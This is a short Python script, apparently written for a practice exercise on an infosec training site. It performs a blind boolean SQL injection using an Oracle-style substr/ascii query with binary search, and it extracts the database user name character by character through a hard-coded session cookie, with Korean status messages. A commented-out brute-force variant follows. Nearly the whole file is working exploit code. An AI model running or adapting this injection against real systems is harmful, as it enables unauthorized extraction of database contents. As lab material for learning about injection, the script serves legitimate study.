import requests

url = 'https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and '

cookies = {
    "JSESSIONID":"23D33A02852401BD740D8FE05343AB4E"
}

querybase = '(select ascii(substr(user, {}, 1)) from dual) > {}'

user = ''
count = 0
for pos in range(1, 9):
    min = 1
    max = 127
    while min != max:
        avg = int((min + max) / 2)
        queryurl = url + querybase.format(pos, avg)
        res = requests.get(queryurl, cookies=cookies)
        count += 1
        if 'MacBook' in res.text:
            min = avg + 1
        else:
            max = avg
    user += chr(min)
    print('유저명 : ' + user)


print('총 쿼리 요청 횟수 : ' + str(count))



# for substrpos in range(1, 9):
#     for ascii in range(65, 91):
#         query = querybase.format(substrpos, ascii)
#         queryurl = url + query
#         res = requests.get(queryurl, cookies=cookies)

#         if 'MacBook' in res.text:
#             print('참')
#             print(str(substrpos) + '번째 글자는 ' + chr(ascii) + '입니다.')
#             result += chr(ascii)
#             break
#         else:
#             print(str(substrpos) + '번째 글자 ascii : ' + str(ascii) + ' 거짓')

# print(result)


